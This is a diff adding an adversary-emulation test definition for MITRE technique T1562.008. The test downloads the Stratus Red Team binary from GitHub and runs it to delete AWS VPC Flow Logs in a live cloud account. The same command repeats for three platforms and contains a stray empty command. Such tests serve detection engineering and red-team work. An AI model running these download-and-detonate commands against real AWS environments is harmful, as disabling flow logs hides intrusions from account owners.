@@ -1,0 +1,69 @@
+- description: 'This Atomic will attempt to remove AWS VPC Flow Logs configuration.
+    Stratus Red Team is a self-contained binary. You can use it to easily detonate
+    offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/
+
+    '
+  id: 496a4b1a-dafc-d521-968c-dd7ff135b2ef
+  name: AWS - Remove VPC Flow Logs using Stratus
+  platforms:
+    darwin:
+      sh:
+        cleanup: export AWS_REGION=us-west-2; echo "Cleanup detonation"; cd $PathToAtomicsFolder/T1562.008/src;
+          ./stratus cleanup --all; rm -rf stratus*
+        command: 'if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else
+          if [ "$(uname)" == "Darwin" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep Darwin_x86_64 | cut -d ''"'' -f 4); wget
+          -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1562.008/src/; elif [ "$(expr substr $(uname)
+          1 5)" == "Linux" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep linux_x86_64 | cut -d ''"'' -f 4) ;   wget
+          -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2
+          ; cd $PathToAtomicsFolder/T1562.008/src; echo "starting warmup"; ./stratus
+          warmup aws.defense-evasion.vpc-remove-flow-logs; echo "starting detonate";
+          ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force'
+        payloads: []
+    linux:
+      sh:
+        cleanup: export AWS_REGION=us-west-2; echo "Cleanup detonation"; cd $PathToAtomicsFolder/T1562.008/src;
+          ./stratus cleanup --all; rm -rf stratus*
+        command: 'if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else
+          if [ "$(uname)" == "Darwin" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep Darwin_x86_64 | cut -d ''"'' -f 4); wget
+          -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1562.008/src/; elif [ "$(expr substr $(uname)
+          1 5)" == "Linux" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep linux_x86_64 | cut -d ''"'' -f 4) ;   wget
+          -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2
+          ; cd $PathToAtomicsFolder/T1562.008/src; echo "starting warmup"; ./stratus
+          warmup aws.defense-evasion.vpc-remove-flow-logs; echo "starting detonate";
+          ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force'
+        payloads: []
+    unknown:
+      sh:
+        cleanup: export AWS_REGION=us-west-2; echo "Cleanup detonation"; cd $PathToAtomicsFolder/T1562.008/src;
+          ./stratus cleanup --all; rm -rf stratus*
+        command: 'if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else
+          if [ "$(uname)" == "Darwin" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep Darwin_x86_64 | cut -d ''"'' -f 4); wget
+          -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1562.008/src/; elif [ "$(expr substr $(uname)
+          1 5)" == "Linux" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep linux_x86_64 | cut -d ''"'' -f 4) ;   wget
+          -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2
+          ; cd $PathToAtomicsFolder/T1562.008/src; echo "starting warmup"; ./stratus
+          warmup aws.defense-evasion.vpc-remove-flow-logs; echo "starting detonate";
+          ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force'
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.008
+    name: 'Impair Defenses: Disable Cloud Logs'
